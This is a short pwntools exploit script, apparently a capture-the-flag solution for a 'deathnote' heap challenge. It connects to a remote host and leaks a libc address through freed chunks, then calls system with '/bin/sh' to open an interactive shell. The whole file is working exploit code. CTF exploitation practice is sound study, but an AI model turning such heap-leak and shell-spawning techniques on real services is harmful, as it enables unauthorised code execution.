#!/usr/bin/env python3

from pwn import *

exe = ELF("./deathnote_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

#p = process()
p = remote('94.237.51.81',34050)


def create(size,idx,content):
    p.sendline(b'1')
    p.sendlineafter(b'request?',size)
    p.sendlineafter(b'Page?',idx)
    p.sendlineafter(b'victim:',content)
def free(idx):
    p.sendline(b'2')
    p.sendlineafter(b'Page?',idx)

def show(idx):
    p.sendline(b'3')
    p.sendlineafter(b'Page?',idx)

for i in range(-1,8,1):
    create(str(0x80),str(i+1),b'pl')

free(str(0))
free(str(1))
free(str(2))
free(str(3))
free(str(4))
free(str(5))
free(str(6))
free(str(7))
show(str(7))
offset = 0x21ace0
p.recvuntil(b'Page content: ')
leak = u64(p.recv(6).ljust(8,b'\x00'))
libc.address = leak - offset 
log.info(f"libc: {hex(libc.address)}")

create(str(0x80),str(0),hex(libc.sym.system))
create(str(0x80),str(1),b'/bin/sh\x00')
p.sendline(b'42')
p.interactive()
